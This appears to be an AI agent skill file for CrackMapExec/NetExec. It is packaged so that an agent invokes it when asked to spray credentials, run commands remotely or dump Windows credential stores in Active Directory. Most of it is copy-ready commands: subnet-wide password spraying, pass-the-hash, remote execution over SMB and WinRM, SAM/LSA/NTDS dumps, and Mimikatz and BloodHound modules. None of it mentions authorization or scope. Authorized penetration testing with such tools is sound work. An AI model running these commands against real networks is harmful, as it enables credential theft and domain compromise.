---
name: crackmapexec
description: "Swiss-army knife for Active Directory environments — SMB/WinRM/LDAP lateral movement, credential spraying, share enumeration, and remote code execution. Use when asked to spray credentials against AD, enumerate SMB shares, execute commands remotely, dump SAM/LSA/NTDS, or map an Active Directory environment."
license: BSD-2-Clause
compatibility: "Linux (primary). Install: pip install crackmapexec or use nxc (NetExec, the maintained fork). Also available as Docker. Pre-installed on Kali."
metadata:
  author: AeonDave
  version: "1.0"
---

# CrackMapExec / NetExec (nxc)

AD post-exploitation multitool — spray, enumerate, execute, and dump across SMB/WinRM/LDAP.

> **Note**: CrackMapExec (cme) is deprecated. Use **NetExec** (`nxc`) — same syntax, actively maintained.

## Quick Start

```bash
# Check connectivity + SMB signing
nxc smb 192.168.1.0/24

# Credential validation
nxc smb 192.168.1.10 -u admin -p Password123

# Enumerate shares
nxc smb 192.168.1.10 -u admin -p Password123 --shares
```

## Protocols

`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `ftp`, `vnc`

## Core Flags

| Flag | Description |
|------|-------------|
| `-u <user>` | Username or user list |
| `-p <pass>` | Password or password list |
| `-H <hash>` | NTLM hash (pass-the-hash) |
| `--local-auth` | Authenticate with local account |
| `-d <domain>` | Domain name |
| `-k` | Use Kerberos authentication |
| `--continue-on-success` | Don't stop on first valid cred |
| `-x <cmd>` | Execute command (cmd.exe) |
| `-X <cmd>` | Execute PowerShell command |
| `--exec-method <m>` | Execution method: `wmiexec,smbexec,atexec,mmcexec` |
| `--shares` | Enumerate shares |
| `--users` | Enumerate domain users |
| `--groups` | Enumerate domain groups |
| `--computers` | Enumerate domain computers |
| `--loggedon-users` | Show logged-on users |
| `--sessions` | Show active sessions |
| `--sam` | Dump SAM hashes |
| `--lsa` | Dump LSA secrets |
| `--ntds` | Dump NTDS.dit (DC only) |
| `-M <module>` | Load a module |
| `--pass-pol` | Get password policy |
| `--rid-brute` | RID brute-force user enumeration |

## Common Workflows

```bash
# Password spray across subnet (continue on success)
nxc smb 192.168.1.0/24 -u users.txt -p "Summer2024!" --continue-on-success

# Pass-the-hash
nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117 --local-auth

# Remote command execution
nxc smb 192.168.1.10 -u admin -p Password123 -x "whoami /all"

# Enumerate shares + readable content
nxc smb 192.168.1.10 -u admin -p Password123 --shares

# SAM dump (local admin required)
nxc smb 192.168.1.10 -u admin -p Password123 --sam

# NTDS dump (domain controller, DA required)
nxc smb <DC_IP> -u admin -p Password123 --ntds

# Execute with WinRM
nxc winrm 192.168.1.10 -u admin -p Password123 -x "ipconfig /all"

# LDAP: enumerate AD users
nxc ldap 192.168.1.10 -u admin -p Password123 --users
```

## Useful Modules

```bash
# Mimikatz (requires admin)
nxc smb 192.168.1.10 -u admin -p Password123 -M mimikatz

# BloodHound data collection
nxc ldap <DC_IP> -u admin -p Password123 -M bloodhound

# WebDAV check
nxc smb 192.168.1.0/24 -M webdav

# Printer nightmare check
nxc smb 192.168.1.0/24 -M printnightmare

# Check for GPP passwords
nxc smb 192.168.1.0/24 -u admin -p Password123 -M gpp_password
```

## Resources

| File | When to load |
|------|--------------|
| `references/modules.md` | Full module list, module-specific flags, output parsing |
